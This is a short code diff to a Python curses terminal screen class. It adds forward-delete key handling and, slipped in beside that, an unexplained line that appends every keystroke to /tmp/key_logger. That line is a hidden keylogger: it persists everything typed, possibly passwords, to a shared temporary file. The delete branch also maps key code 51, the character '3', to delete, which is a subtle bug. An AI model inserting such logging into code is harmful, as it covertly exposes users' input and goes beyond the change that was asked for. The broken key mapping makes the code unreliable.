@@ -381,11 +381,17 @@ class Screen(CursesStdIO):
                 self.display_lines_offset = 0
             self.refresh()
 
+        open("/tmp/key_logger", "a").write(str(c) + "\n")
+
         # Delete a character in the input string based on cursor position
         if c == curses.KEY_BACKSPACE or c == 127:
             if self.input and self.input_cursor > 0:
                 self.input = self.input[:self.input_cursor - 1] + self.input[self.input_cursor:]
                 self.input_cursor -= 1
+
+        elif c == curses.KEY_DC or c == 51:
+            if self.input and self.input_cursor < len(self.input):
+                self.input = self.input[:self.input_cursor] + self.input[self.input_cursor + 1:]
 
         # A key to add to the input string
         else:
